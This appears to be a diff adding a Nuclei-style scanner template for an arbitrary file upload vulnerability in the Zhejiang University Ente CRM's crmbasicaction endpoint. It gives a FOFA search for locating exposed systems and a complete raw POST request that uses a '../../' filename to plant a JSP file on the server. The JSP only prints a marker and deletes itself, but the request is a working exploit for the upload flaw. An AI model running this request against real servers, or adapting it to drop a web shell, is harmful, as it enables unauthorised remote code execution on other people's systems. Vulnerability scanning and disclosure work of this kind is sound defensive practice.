@@ -1,0 +1,34 @@
+id: zdenter-crm-crmbasicaction-file-upload
+
+info:
+  name: 浙大恩特客户资源管理系统 crmbasicaction 接口任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="欢迎使用浙大恩特客户资源管理系统" || body="script/Ent.base.js" || app="浙大恩特客户资源管理系统"
+      浙大恩特客户资源管理系统中的crmbasicaction接口存在文件上传安全缺陷，攻击者可利用该接口上传恶意JSP文件至目标系统，进而可能触发远程代码执行风险。此漏洞可能严重威胁目标系统的数据完整性与运行安全性。
+  tags: 浙大恩特客户资源管理系统
+
+http:
+- raw:
+  - |
+    POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: close
+    Content-Type: multipart/form-data; boundary=0rwysvgvy7rxv790mpju
+
+    --0rwysvgvy7rxv790mpju
+    Content-Disposition: form-data; name="file"; filename="../../NTest.jsp"
+    Content-Type: application/zip
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    --0rwysvgvy7rxv790mpju--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
